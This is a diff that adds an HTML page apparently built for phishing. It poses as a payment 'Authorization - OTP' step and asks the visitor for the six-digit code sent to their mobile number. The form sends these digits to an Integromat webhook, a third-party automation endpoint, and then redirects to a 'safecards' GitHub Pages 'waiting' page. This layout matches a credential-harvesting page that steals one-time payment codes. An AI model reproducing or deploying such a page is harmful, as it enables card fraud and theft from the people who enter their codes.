@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authorization - OTP</title>
+  <link rel="stylesheet" href="./style.css">
+	<!-- add icon link -->
+        <link rel = "icon" href = 
+"https://cdn4.vectorstock.com/i/1000x1000/64/53/contactless-payment-credit-card-and-hand-tap-logo-vector-26336453.jpg" 
+        type = "image/x-icon">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="prompt">
+	Enter the OTP sent to your registered mobile number and click on Pay !
+</div>
+
+<form action="https://hook.integromat.com/stpe8xb1994dv9naukp5bca9t6l0gfja" method="post" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
+	<input type="hidden" id="redirect" name="redirect" value="https://safecards.github.io/waiting/">
+	<input type="text" id="digit-1" name="digit-1" data-next="digit-2" required/>
+	<input type="text" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" required/>
+	<input type="text" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" required/>
+	<span class="splitter">&ndash;</span>
+	<input type="text" id="digit-4" name="digit-4" data-next="digit-5" data-previous="digit-3" required/>
+	<input type="text" id="digit-5" name="digit-5" data-next="digit-6" data-previous="digit-4" required/>
+	<input type="text" id="digit-6" name="digit-6" data-previous="digit-5" required/> <br><br>
+	<div class="cool"><button type="submit" class="button"><span>Pay</span></button></div>
+</form>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script  src="./script.js"></script>
+
+</body>
+</html>
